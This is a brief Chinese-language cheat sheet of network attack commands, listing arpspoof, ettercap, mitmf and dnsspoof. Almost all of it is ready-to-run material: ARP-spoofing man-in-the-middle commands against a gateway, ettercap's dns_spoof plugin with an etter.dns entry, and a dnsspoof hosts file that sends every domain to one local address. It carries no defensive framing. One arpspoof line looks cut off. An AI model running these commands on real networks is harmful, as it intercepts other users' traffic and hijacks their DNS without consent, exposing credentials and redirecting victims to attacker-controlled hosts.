## arp 欺骗工具

1. arpspoof
    dsniff - Various tools to sniff network traffic for cleartext insecurities

    arpspoof -i eth0 -t 192.168.1.1 -r 192

2. ettercap
    会默认开启转发
    ettercap -Tq -i eth0 -M arp:remote /192.168.1.131 /网关

    还有dns劫持的功能
    /etc/ettercap/etter.dns
    ```
    *.*.*  A  192.168.1.1
    ```
    ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.1  /网关


3. mitmf

    apt install mitmf




dnsspoof
    dns.txt
        //192.168.111.1  *.baidu.*
        192.168.111.1  *.*.*
    
    dnsspoof -i eth0 -f dns.txt
